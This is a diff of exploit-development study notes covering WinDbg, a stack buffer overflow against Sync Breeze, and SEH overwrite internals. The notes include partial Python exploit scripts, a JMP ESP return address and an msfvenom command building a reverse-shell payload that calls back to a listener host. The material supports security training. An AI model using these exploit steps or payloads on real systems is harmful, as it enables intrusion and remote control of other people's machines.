@@ -129,9 +129,7 @@ Set up the debugging environment:
 
 Force the download of available symbols for all loaded modules before debugging
 
-```
-.reload /f
-```
+`.reload /f`
 
 Inspect the assembly code of certain Windows APIs + any part of the code of the current running program.
 
@@ -152,9 +150,7 @@ u @eip
 
 `ub` command is a variation on the unassemble command that disassembles instructions prior to the supplied address.
 
-```
-ub 00c0299b L1
-```
+`ub 00c0299b L1`
 
 ### Reading from Memory
 
@@ -245,9 +241,7 @@ dt ntdll!_TEB @$teb ThreadLocalStoragePointer
 
 Display the **size of a structure** extracted from a symbol file
 
-```
-?? sizeof(ntdll!_TEB)
-```
+`?? sizeof(ntdll!_TEB)`
 
 ### Writing to Memory
 
@@ -718,16 +712,18 @@ x/s 0x402000
 # Exploiting Stack Overflows
 
 Data Execution Prevention (DEP):
-- is a set of hardware and software technologies that perform additional memory checks to help prevent malicious code from running on a system.
+- perform additional memory checks to help prevent malicious code from running on a system.
 - helps prevent code execution from data pages by raising an exception when attempts are made to do so.
 
 Address Space Layout Randomization (ASLR) randomizes the base addresses of loaded applications and DLLs every time the OS is booted.
 
 On older Windows OS, like Windows XP where ASLR is not implemented, all DLLs are loaded at the same memory address every time, which makes exploitation easier.
 
-When coupled with DEP, ASLR provides a very strong mitigation against exploitation.
+DEP + ASLR provides a very strong mitigation against exploitation.
 
-Control Flow Guard (CFG) is Microsoft's implementation of control-flow integrity: performs validation of **indirect code branching** such as a **call instruction that uses a register** as an operand **rather than a memory address** such as CALL EAX.
+Control Flow Guard (CFG) is Microsoft's implementation of control-flow integrity.
+
+It performs validation of **indirect code branching** such as a **call instruction that uses a register** as an operand **rather than a memory address** such as CALL EAX.
 
 => Prevent the overwrite of function pointers in exploits.
 
@@ -763,7 +759,7 @@ int main(int argc, char *argv[])
 | Main parameter 1 | Main parameter 1 | AAAA |
 | Main parameter 2 | Main parameter 2 | AAAA |
 
-The CPU will try to read the next instruction from 0x41414141 (0x41 hexadecimal value of "A").
+The CPU will try to read the next instruction from `0x41414141` (hexadecimal value of `AAAA`).
 
 Since this is not a valid address in the process memory space, the CPU will trigger an access violation, crashing the application.
 
@@ -807,15 +803,19 @@ except socket.error:
   print("Could not connect!")
 ```
 
-The EIP register is overwritten by 4 `0x41` bytes, which are part of our `username` string, the 800-byte "A" buffer.
+The EIP register is overwritten by four `0x41` bytes, which are part of our `username` string, the 800-byte "A" buffer.
 
 Which part of our buffer is landing in EIP?
 
-1. Attempt a binary tree analysis: Instead of 800 A's, send 400 A's and 400 B's. If EIP is overwritten by B's => The 4 bytes are in the 2nd half of the buffer. Then change the 400 B's to 200 B's and 200 C's, and send the buffer again. Continue splitting the specific buffer until we reach the exact 4 bytes that overwrite EIP.
+1. Attempt a binary tree analysis: Instead of 800 A's, send 400 A's and 400 B's.
+
+- If EIP is overwritten by B's => The 4 bytes are in the 2nd half of the buffer.
+- Then change the 400 B's to 200 B's and 200 C's, and send the buffer again.
+- Continue splitting the specific buffer until we reach the exact 4 bytes that overwrite EIP.
 
 2. Insert a long string made of non-repeating 4-byte chunks as our input > when the EIP is overwritten with 4 bytes from our string, use that unique sequence to pinpoint the exact location. 
 
-Generate a non-repeating string
+Generate a non-repeating string:
 
 ```bash
 locate pattern_create
@@ -839,12 +839,13 @@ try:
 ...
 ```
 
-The EIP register has been overwritten with `42306142` (hexadecimal value of "B0aB"). 
+The EIP register has been overwritten with `42306142` (hexadecimal value of `B0aB`). 
 
 ```bash
 msf-pattern_offset -l 800 -q 42306142
 ```
-[*] Exact match at offset 780
+
+`[*] Exact match at offset 780`
 
 ```python
 #!/usr/bin/python
@@ -875,7 +876,7 @@ dds esp -10 L8
 
 The first 4 C's from our buffer landed at address `0x00567458`.
 
-The current **ESP** value is `0x0056745c`, which points to the next 4 C's from our buffer.
+ESP == `0x0056745c`, which points to the next 4 C's from our buffer.
 
 A standard reverse shell payload requires ~350-400 bytes of space.
 
@@ -907,9 +908,8 @@ dds esp - 8 L7
 dds esp+2c0 L4
 ```
 
-```
-? 00567724 - 0056745c
-```
+`? 00567724 - 0056745c`
+
 Evaluate expression: 712 = 000002c48
 
 => 712 bytes of free space for our shellcode.
@@ -961,23 +961,21 @@ try:
 ...
 ```
 
-```
-db esp - 10 L20
-```
+`db esp - 10 L20`
 
 `0x0A` character translates to a **line feed**, which terminates an HTTP field, similar to a **carriage return**.
 
 Repeat these steps until we have verified every character.
 
-=> `0x00, 0x0A, 0x0D, 0x25, 0x26, 0x2B, and 0x3D` will mangle our input buffer while attempting to overflow the destination buffer.
+=> `0x00, 0x0A, 0x0D, 0x25, 0x26, 0x2B, 0x3D` will mangle our input buffer while attempting to overflow the destination buffer.
 
 ## Finding a Return Address
 
-Leverage a `JMP ESP` instruction => Find a reliable static address that contains this instruction
+Find a reliable static address that contains a `JMP ESP` instruction.
 
-Redirect EIP to this address, the JMP ESP instruction will be executed and direct the execution flow into our shellcode.
+Redirect EIP to this address, the `JMP ESP` instruction will be executed and direct the execution flow into our shellcode.
 
-Many support libraries in Windows contain this commonly-used instruction, but 2 important criteria:
+Many support libraries in Windows contain this commonly-used instruction, 2 important criteria:
 
 1. The address used in the library must be static, which eliminates the libraries compiled with **ASLR** support.
 
@@ -993,48 +991,41 @@ Find the protections of the `syncbrs.exe` executable
 
 Get the base address of the module
 
-```
-lm m syncbrs
-```
+`lm m syncbrs`
 
 Dump the `IMAGE_DOS_HEADER5`
 
-```
-dt ntdll!_IMAGE_DOS_HEADER 0x00400000 
-```
+`dt ntdll!_IMAGE_DOS_HEADER 0x00400000`
 
 At offset `0x3C`, the `e_lfanew` field contains the offset to our PE header (`0xE8`) from the base address of `syncbrs.exe`
 
-```
-? 0n232
-```
+`? 0n232`
+
 Evaluate expression: 232 = 000000e8
 
-```
-dt ntdll!_IMAGE_NT_HEADERS 0x00400000+0xe8
-```
+`dt ntdll!_IMAGE_NT_HEADERS 0x00400000+0xe8`
 
-At offset `0x18` we have the IMAGE_OPTIONAL_HEADER structure we need that contains the DllCharacteristics field.
+At offset `0x18` we have the `IMAGE_OPTIONAL_HEADER` structure we need that contains the `DllCharacteristics` field.
 
-```
-dt ntdll!_IMAGE_OPTIONAL_HEADER 0x00400000+0xe8+0x18
-```
+`dt ntdll!_IMAGE_OPTIONAL_HEADER 0x00400000+0xe8+0x18`
 
-The current value of `DllCharacteristics` is `0x00` => `syncbrs.exe` does not have any protections enabled such as **SafeSEH** (Structured Exception Handler Overwrite), an exploit-preventative memory protection technique, **ASLR**, or **NXCompat** (DEP protection).
+The current value of `DllCharacteristics` is `0x00`.
+
+=> `syncbrs.exe` does not have any protections enabled such as **SafeSEH** (Structured Exception Handler Overwrite), an exploit-preventative memory protection technique, **ASLR**, or **NXCompat** (DEP protection).
 
 The `ImageBase` member being set to `0x400000` => the preferred load address for `syncbrs.exe` is `0x00400000`. 
 
 => All instructions' addresses (`0x004XXXXX`) will contain at least one null character => unsuitable for our input buffer.
 
-**Process Hacker** tool detects mitigations, such as DEP and ASLR, + more modern mitigations such as ACG and CFG.
+**Process Hacker** tool detects mitigations, such as DEP and ASLR,and more modern mitigations such as ACG and CFG.
 
-Launch Process Hacker > Double click the `syncbrs.exe` executable >  Under the **General** tab, find the **Mitigation Policies** field, which is currently set to "None" > Clicking on **Details** also shows no mitigations in place.
+Launch **Process Hacker** > Double click the `syncbrs.exe` executable >  Under the **General** tab, find the **Mitigation Policies** field, which is currently set to "None" > Clicking on **Details** also shows no mitigations in place.
 
 Browsing to the **Module** tab provides us with all the **DLLs** that are loaded in the process memory > To inspect the `DllCharacteristics`, double click on a module and open the properties window.
 
-Searching through all the modules, we discover that `LIBSSP.DLL` suits our needs and the **address range** doesn't seem to contain bad characters.
-
 **Advanced tip**: If this application was compiled with **DEP** support, our `JMP ESP` address would need to be located in the `.text` code segment of the module. This is the only segment with both read (R) and executable (E) permissions.
+
+Searching through all the modules, we discover that `LIBSSP.DLL` suits our needs and the **address range** doesn't seem to contain bad characters.
 
 Since DEP is not enabled in this case, we can use instructions from any address in this module.
 
@@ -1042,23 +1033,17 @@ Since DEP is not enabled in this case, we can use instructions from any address 
 msf-nasm_shell
 nasm > jmp esp
 ```
+00000000  FFE4              jmp esp
 
-*00000000  FFE4              jmp esp*
+`lm m libspp`
 
-```nasm
-lm m libspp
-```
-10000000 10223000   libspp   C (export symbols)       C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll
+`10000000 10223000   libspp   C (export symbols)       C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll`
 
-```nasm
-s -b 10000000 10223000 0xff 0xe4
-```
+`s -b 10000000 10223000 0xff 0xe4`
 
-the output reveals one address containing a JMP ESP instruction (`0x10090c83`), which fortunately does not contain any of our bad characters.
+One address containing a `JMP ESP` instruction (`0x10090c83`), which fortunately does not contain any of our bad characters.
 
-```nasm
-u 10090c83
-```
+`u 10090c83`
 
 ```python
 #!/usr/bin/python
@@ -1079,9 +1064,9 @@ try:
 ...
 ```
 
-The `JMP ESP` address is written in reverse order; Little endian is currently the most widely-used format and is used by the x86 and AMD64 architectures.
+The `JMP ESP` address is written in reverse order;
 
-In the little endian format, the low-order byte of the number is stored in memory at the lowest address, and the high-order byte at the highest address. Therefore, we have to store the return address in reverse order in our buffer for the CPU to interpret it correctly in memory.
+**Little endian** is used by the x86 and AMD64 architectures - the low-order byte of the number is stored in memory at the lowest address, and the high-order byte at the highest address.
 
 ```
 bp 10090c83
@@ -1102,25 +1087,27 @@ Replace regex `"\n"` with blank in VS Code
 
 ## Getting a Shell
 
-Because of the encoding, the shellcode is prepended by a decoder stub.
-
-The job of this stub is to iterate over the encoded shellcode bytes and decode them back to their original executable form.
-
-The decoder needs to get its address in memory and look a few bytes ahead to locate the encoded shellcode that it needs to decode.
+Because of the encoding, the shellcode is prepended by a **decoder stub**.
 
 During the process of gathering the decoder stub's location in memory, the code performs a sequence of assembly instructions commonly referred to as a **GetPC** routine.
 
-This short routine moves the value of the EIP register (sometimes referred to as the Program Counter or PC) into another register.
+This routine moves the value of the EIP register into another register.
 
-As with other GetPC routines, those used by shikata_ga_nai have an unfortunate side-effect of writing data at and around the top of the stack.
+As with other GetPC routines, those used by `shikata_ga_nai` have an unfortunate side-effect of writing data at and around the top of the stack.
 
-This eventually mangles several bytes close to the address pointed at by the ESP register. This small change on the stack is a problem for us because the decoder starts exactly at the address pointed to by the ESP register. In short, the GetPC routine execution ends up changing a few bytes of the decoder itself, and potentially the encoded shellcode. This will eventually cause the decoding process to fail and crash the target process.
+This eventually mangles several bytes close to the address pointed at by the ESP register.
+
+The decoder starts exactly at the address pointed to by the ESP register.
+
+=> The GetPC routine execution ends up changing a few bytes of the decoder itself, and potentially the encoded shellcode. 
+
+=> Cause the decoding process to fail and crash the target process.
 
 To avoid this issue, 2 ways:
 
 - Adjust ESP backwards, making use of assembly instructions such as `DEC ESP`, `SUB ESP, 0xXX` before executing the decoder.
 
-- Precede our payload with a series of No Operation (`NOP`) instructions, which have an opcode value of `0x90`. These instructions, also defined as a NOP sled or NOP slide, will let the CPU "slide" through the NOPs until the payload is reached.
+- Precede our payload with a series of No Operation (`NOP`) instructions, which have an opcode value of `0x90` aka **NOP sled** or **NOP slide**, will let the CPU "slide" through the NOPs until the payload is reached.
 
 By the time the execution reaches the shellcode decoder, the stack pointer is far enough away not to corrupt the shellcode when the GetPC routine overwrites a few bytes on the stack.
 
@@ -1173,9 +1160,9 @@ except socket.error:
 
 ## Improving the Exploit
 
-Following its execution, the default exit method of a Metasploit shellcode is the **ExitProcess** API. This exit method will shut down the whole web service process when the reverse shell is terminated, effectively killing the Sync Breeze service and causing it to crash.
+The default `exit` method of a Metasploit shellcode is the **ExitProcess** API - will shut down the whole web service process when the reverse shell is terminated, effectively killing the Sync Breeze service and causing it to crash.
 
-If the program we are exploiting is a **threaded application**, try to avoid crashing the service completely by using the **ExitThread** API to only terminate the affected thread of the program.
+If the program we are exploiting is a **threaded application**, use the **ExitThread** API to only terminate the affected thread of the program.
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
@@ -1290,22 +1277,11 @@ except socket.error:
   print("Could not connect!")
 ```
 
-The EAX register was overwritten by our "A" buffer.
+The `EAX` register was overwritten by our "A" buffer. Attempting to execute the `call dword ptr [eax+24h]` instruction triggers an access violation.
 
-Attempting to execute the "call dword ptr [eax+24h]" instruction triggers an access violation.
+The debugger intercepted a 1st chance exception, which is a notification that an unexpected event occurred during the program's normal execution.
 
-```
-r
-dds esp L30
-```
-
-At this point, the debugger intercepted a 1st chance exception, which is a notification that an unexpected event occurred during the program's normal execution.
-
-If we let the application go (g), we have now "magically" gained control over the instruction pointer (eip=41414141)
-
-```
-g
-```
+Let the application go with `g`, we gained control over the instruction pointer (`eip=41414141`)
 
 ## Structured Exception Handling
 
@@ -1313,9 +1289,9 @@ g
 
 2 kinds of exceptions:
 
-- **Hardware** exceptions are initiated by the CPU. E.g. when our script crashed the Sync Breeze service as the CPU attempted to dereference an invalid memory address.
+- **Hardware** exceptions are initiated by the CPU. E.g. When our script crashed the Sync Breeze service as the CPU attempted to dereference an invalid memory address.
 
-- **Software** exceptions are explicitly initiated by applications when the execution flow reaches unexpected or unwanted conditions. E.g., a software developer might want to raise an exception in their code to signal that a function could not execute normally because of an invalid input argument.
+- **Software** exceptions are explicitly initiated by applications when the execution flow reaches unexpected or unwanted conditions. E.g., A software developer might want to raise an exception in their code to signal that a function could not execute normally because of an invalid input argument.
 
 Define an exception construct through a `_try/_except` code block.
 
@@ -1353,17 +1329,13 @@ This is a special exception handler that terminates the current process or threa
 
 Dump the TEB structure:
 
-```nasm
-dt nt!_TEB
-```
+`dt nt!_TEB`
 
 The `nt!_TEB` structure starts with a nested structure called `_NT_TIB`.
 
 Dumping `_NT_TIB` shows the 1st member in this structure is a pointer named `ExceptionList`, which points to the first `_EXCEPTION_REGISTRATION_RECORD` structure.
 
-```
-dt _NT_TIB
-```
+`dt _NT_TIB`
 
 The `_EXCEPTION_REGISTRATION_RECORD` structure contains 2 members:
 
@@ -1371,9 +1343,7 @@ The `_EXCEPTION_REGISTRATION_RECORD` structure contains 2 members:
 
 - `Handler`, which points to an `_EXCEPTION_DISPOSITION` structure.
 
-```
-dt _EXCEPTION_REGISTRATION_RECORD
-```
+`dt _EXCEPTION_REGISTRATION_RECORD`
 
 The `Next` member acts as a link between `_EXCEPTION_REGISTRATION_RECORD` structures in the singly-linked list of registered exception handlers.
 
@@ -1398,17 +1368,13 @@ Inside a debugger, the function can have different name variations, such as `ntd
 
 Dump the `CONTEXT` structure
 
-```
-dt ntdll!_CONTEXT
-```
+`dt ntdll!_CONTEXT`
 
 This structure stores the state of all our registers, including the instruction pointer (EIP). => used to **restore the execution flow after handling the exception**.
 
 `_EXCEPTION_DISPOSITION` structure contains the result of the exception handling process.
 
-```nasm
-dt _EXCEPTION_DISPOSITION
-```
+`dt _EXCEPTION_DISPOSITION`
 
 - If the exception handler invoked by the OS is not valid for dealing with a specific exception, it will return `ExceptionContinueSearch`. This result instructs the OS to move on to the next `_EXCEPTION_REGISTRATION_RECORD` structure in the linked list.
 
@@ -1524,9 +1490,7 @@ Instead, we will inspect the chain of `_EXCEPTION_REGISTRATION_RECORD` structure
 
 Obtain the TEB address which will contain the `ExceptionList` pointer:
 
-```
-!teb
-```
+`!teb`
 
 The `ExceptionList` starts very close to the beginning of the `StackBase`.
 
@@ -1569,101 +1533,271 @@ dt _EXCEPTION_REGISTRATION_RECORD 0x01c4ff54
 
 The exception occurs because the application is trying to read and execute from an unmapped memory page. This causes an access violation exception that needs to be handled by either the application or the OS.
 
-WinDbg allows us to automatically list the current thread exception handler chain with !exchain.4 The !exchain extension displays the exception handlers of the current thread. It supports three arguments that can be used to gather information on specific types of exceptions, such as C++ try/catch exceptions. By default, it displays the exception handler implemented using the SEH mechanism.
+List the current thread exception handler chain:
 
+`!exchain`
 
+The 1st step in the SEH mechanism is to obtain the address of the first `_EXCEPTION_REGISTRATION_RECORD` structure from the TEB.
 
-```nasm
+The OS then proceeds to call each `_except_handler` function until the exception is properly handled, or it simply crashes the process if no handler could successfully deal with the exception.
 
+At this point, the address of at least one of the `_except_handler` functions has been overwritten by our buffer (`0x41414141`).
+
+=> Whenever this `_EXCEPTION_REGISTRATION_RECORD` structure is used to handle the exception, the CPU will end up calling `0x41414141`, giving us control over the EIP register.
+
+Resuming execution and letting the application attempt to handle the exception with `g`.
+
+Inspect the **callstack** to determine which functions were called before the EIP register was overwritten
+
+`k`
+
+```
+ # ChildEBP RetAddr  
+00 01c4f434 77383b02 0x41414141
+01 01c4f458 77383ad4 ntdll!ExecuteHandler2+0x26
+02 01c4f528 77371586 ntdll!ExecuteHandler+0x24
+03 01c4f528 00ac2a9d ntdll!KiUserExceptionDispatcher+0x26
+04 01c4fec8 00000000 libpal!SCA_ConfigObj::Deserialize+0x1d
+```
+
+`ntdll!ExecuteHandler2` was called directly before we achieved code execution. This function is responsible for calling the `_except_handler` functions registered on the stack.
+
+List all the registers to determine if any of them point to our buffer:
+
+`r`
+
+The ECX register is being overwritten alongside the instruction pointer while most of the other registers are NULL.
+
+`u edx`
+
+EDX appears to point somewhere inside the `ntdll!ExecuteHandler2` function.
+
+=> None of the registers point to our buffer at the moment we gain control over the execution.
+
+`dds esp La`
+
+We do not overwrite any data on the stack (which ESP and EBP point to).
+
+Set a breakpoint at the `ntdll!ExecuteHandler2` function to stop the execution before WinDbg intercepts the exception (after the  1st chance exception)
+
+`bp ntdll!ExecuteHandler2`
+
+When the access violation is triggered, the 1st entry in `ExceptionList` is not overwritten by our buffer => Is still a valid `_EXCEPTION_REGISTRATION_RECORD` structure.
+
+Our overflow only affects the following `_EXCEPTION_REGISTRATION_RECORD` structure in the linked list.
+
+=> When the SEH mechanism tries to handle the exception, `ntdll!ExecuteHandler2` will be called twice.
+
+Initially, it will use the first `_EXCEPTION_REGISTRATION_RECORD` structure (which is still intact) and then proceed to use the corrupted structure.
+
+When the breakpoint is first triggered, let execution resume twice with `g`.
+
+After hitting our breakpoint the 2nd time, inspect the assembly code of the executing function:
+
+`u @eip L11`
+
+```
+ntdll!ExecuteHandler2:
+55              push    ebp
+8bec            mov     ebp,esp
+ff750c          push    dword ptr [ebp+0Ch]
+52              push    edx
+64ff3500000000  push    dword ptr fs:[0]
+64892500000000  mov     dword ptr fs:[0],esp
+ff7514          push    dword ptr [ebp+14h]
+ff7510          push    dword ptr [ebp+10h]
+ff750c          push    dword ptr [ebp+0Ch]
+ff7508          push    dword ptr [ebp+8]
+8b4d18          mov     ecx,dword ptr [ebp+18h]
+ffd1            call    ecx
+648b2500000000  mov     esp,dword ptr fs:[0]
+648f0500000000  pop     dword ptr fs:[0]
+8be5            mov     esp,ebp
+5d              pop     ebp
+c21400          ret     14h
+```
+
+According to the call stack, `call ecx` should call the overwritten `_except_handler` function (`0x41414141`).
+
+This function accepts 4 arguments as inferred from the 4 PUSH instructions preceding the `call ecx`.
+
+This matches the `_except_handler` function prototype:
+
+```C
+typedef EXCEPTION_DISPOSITION _except_handler (*PEXCEPTION_ROUTINE) (  
+    IN PEXCEPTION_RECORD ExceptionRecord,  
+    IN VOID EstablisherFrame,
+    IN OUT PCONTEXT ContextRecord, 
+    IN OUT PDISPATCHER_CONTEXT DispatcherContext  
+); 
+```
+
+We start by saving the EBP register on the stack and moving the stack pointer to EBP in order to easily access the arguments passed to the `ntdll!ExecuteHandler2` function (running `t` twice).
+
+`ff750c   push dword ptr [ebp+0Ch]  ss:0023:018ef464=018eff54`
+
+`!teb`
+
+```
+TEB at 003c4000
+    ExceptionList:        018efe1c
+    StackBase:            018f0000
+    StackLimit:           018ee000
+```
+
+`dt _EXCEPTION_REGISTRATION_RECORD 018efe1c`
+
+```
+ntdll!_EXCEPTION_REGISTRATION_RECORD
+   +0x000 Next         : 0x018eff54   _EXCEPTION_REGISTRATION_RECORD
+   +0x004 Handler      : 0x0097df5b   _EXCEPTION_DISPOSITION  libpal!md5_starts+0
+```
+
+The first PUSH instruction push the `Next` member of the first `_EXCEPTION_REGISTRATION_RECORD` structure on the stack.
+
+```
+t
+u @edx
+```
+
+```
+ntdll!ExecuteHandler2+0x44:
+8b4c2404        mov     ecx,dword ptr [esp+4]
+f7410406000000  test    dword ptr [ecx+4],6
+b801000000      mov     eax,1
+7512            jne     ntdll!ExecuteHandler2+0x68 (770a3b44)
+8b4c2408        mov     ecx,dword ptr [esp+8]
+8b542410        mov     edx,dword ptr [esp+10h]
+8b4108          mov     eax,dword ptr [ecx+8]
+8902            mov     dword ptr [edx],eax
+```
+
+`push edx` appears to place an offset into the `ntdll!ExecuteHandler2` function on the stack.
+
+`t`
+
+```
+64ff3500000000  push dword ptr fs:[0]  fs:003b:00000000=018efe1c
+```
+
+`!teb`
+
+```
+TEB at 003c4000
+    ExceptionList:        018efe1c
+    StackBase:            018f0000
+    StackLimit:           018ee000
+```
+
+The 3rd PUSH instruction push the current thread `ExceptionList` onto the stack.
+
+`t`
+
+This is followed by a `mov dword ptr fs:[0],esp` instruction, which will overwrite the current thread `ExceptionList` with the value of ESP.
+
+`!teb`
+
+```
+TEB at 003c4000
+    ExceptionList:        018efe1c
+    StackBase:            018f0000
+    StackLimit:           018ee000
+```
+
+`t`
+
+```
+ff7514   push dword ptr [ebp+14h]  ss:0023:018ef46c=018ef4cc
+```
+
+`!teb`
+
+```
+TEB at 003c4000
+    ExceptionList:        018ef44c
+    StackBase:            018f0000
+    StackLimit:           018ee000
+```
+
+`dt _EXCEPTION_REGISTRATION_RECORD 018ef44c`
+
+```
+ntdll!_EXCEPTION_REGISTRATION_RECORD
+   +0x000 Next             : 0x018efe1c _EXCEPTION_REGISTRATION_RECORD
+   +0x004 Handler          : 0x770a3b20     _EXCEPTION_DISPOSITION  ntdll!ExecuteHandler2+0
+```
+
+Before pushing the parameters required for the `_except_handler` function and calling it, the OS updates `ExceptionList` with a new `_EXCEPTION_REGISTRATION_RECORD` structure.
+
+This new `_EXCEPTION_REGISTRATION_RECORD` is responsible for handling exceptions that might occur during the call to `_except_handler`.
+
+The function used to handle these exceptions is placed in EDX before the call to `ntdll!ExecuteHandler2`.
+
+The OS leverages various exception handlers depending on the function that is used to invoke the `_except_handler`. In our case, the handler located at `0x770a3b20` is used to deal with exceptions that might occur during the execution of `RtlpExecuteHandlerForException`.
+
+After the execution of `_except_handler` ("call ecx"), the OS restores the original `ExceptionList` by removing the previously added `_EXCEPTION_REGISTRATION_RECORD`. This is done by executing the two instructions `mov esp,dword ptr fs:[0]` and `pop dword ptr fs:[0]`.
+
+Proceed to single-step the remaining instructions with `t` and stop at `call ecx` to inspect the address we are about to redirect the execution flow to.
+
+## Gaining Code Execution
+
+`r`
+
+```
+eax=00000000 ebx=00000000 ecx=41414141 edx=77f16b30 esi=00000000 edi=00000000
+eip=77f16b10 esp=013ff33c ebp=013ff358 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+ntdll!ExecuteHandler2+0x24:
+77f16b10 ffd1            call    ecx {41414141}
+```
+
+`dds esp L6`
+
+```
+013ff33c  013ff440
+013ff340  013fff54
+013ff344  013ff45c
+013ff348  013ff3cc
+013ff34c  013ffe1c
+013ff350  77f16b30 ntdll!ExecuteHandler2+0x44
+```
+
+The moment our fake handler function is called, the stack will contain the return address followed by the four _except_handler arguments.
+
+```c
+typedef EXCEPTION_DISPOSITION _except_handler (*PEXCEPTION_ROUTINE) (  
+    IN PEXCEPTION_RECORD ExceptionRecord,  
+    IN VOID EstablisherFrame,
+    IN OUT PCONTEXT ContextRecord, 
+    IN OUT PDISPATCHER_CONTEXT DispatcherContext  
+);
+```
+
+The 2nd argument (EstablisherFrame) is a pointer to the `_EXCEPTION_REGISTRATION_RECORD` structure used to handle the exception.
+
+`dt _EXCEPTION_REGISTRATION_RECORD 013fff54`
+
+```
+ntdll!_EXCEPTION_REGISTRATION_RECORD
+   +0x000 Next             : 0x41414141 _EXCEPTION_REGISTRATION_RECORD
+   +0x004 Handler          : 0x41414141     _EXCEPTION_DISPOSITION  +41414141
+```
+   
+`dd 013fff54`
+
+```
+013fff54  41414141 41414141 41414141 41414141
+013fff64  41414141 41414141 41414141 41414141
+013fff74  41414141 41414141 41414141 41414141
+013fff84  41414141 41414141 41414141 41414141
+013fff94  41414141 41414141 41414141 41414141
+013fffa4  41414141 41414141 41414141 41414141
+013fffb4  41414141 41414141 41414141 41414141
+013fffc4  41414141 41414141 41414141 41414141
 ```
 
 
-```nasm
-
 ```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-```nasm
 
 ```
 
